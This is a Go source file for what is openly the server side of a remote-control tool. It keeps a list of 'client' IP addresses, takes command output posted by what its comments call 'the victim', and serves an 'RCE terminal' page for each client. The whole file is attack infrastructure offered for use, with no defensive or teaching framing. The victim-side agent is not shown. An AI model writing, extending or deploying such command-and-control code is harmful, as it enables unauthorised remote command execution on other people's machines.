package main

import (
	"fmt"
	"net/http"
	"github.com/gorilla/mux"
)

// list of clients' IPv4 addresses
var clients []string

func main(){
	r := mux.NewRouter()

	r.HandleFunc("/newClient", newClientHandler)
	r.HandleFunc("/client/{ip}", clientHandler).Methods("POST")
	r.HandleFunc("/client/{ip}", clientRCEHandler).Methods("GET")

	http.ListenAndServe(":8090", r)
}


/* route handlers */
func newClientHandler(w http.ResponseWriter, req *http.Request) {
	ipAddr := req.FormValue("ip")
	fmt.Println("[+] New connection established from:", ipAddr)
	clients = append(clients, ipAddr)	// add ip to the client list

	fmt.Fprintf(w, "Received")
}


/*
	func clientHandler(w, req) listens for POST requests on "/client/{ip}",
	this is the endpoint for the victim to send the CMD result output.
*/
func clientHandler(w http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)
	output := req.FormValue("output")
	ipAddr := vars["ip"]

	isClient := false

	for _, element := range clients {
		if ipAddr == element {
			isClient = true
			break
		}
	}

	if !isClient {
		fmt.Fprintf(w, "Error: Not a client.")
		return
	}

	fmt.Println(output)
}


/*
	func clientRCEHandler(w, req) is the webpage for the RCE terminal
	of a specific client with an IP address given by the URL route.
*/
func clientRCEHandler(w http.ResponseWriter, req *http.Request) {
	http.ServeFile(w, req, "../static/ClientRCE.html")
}
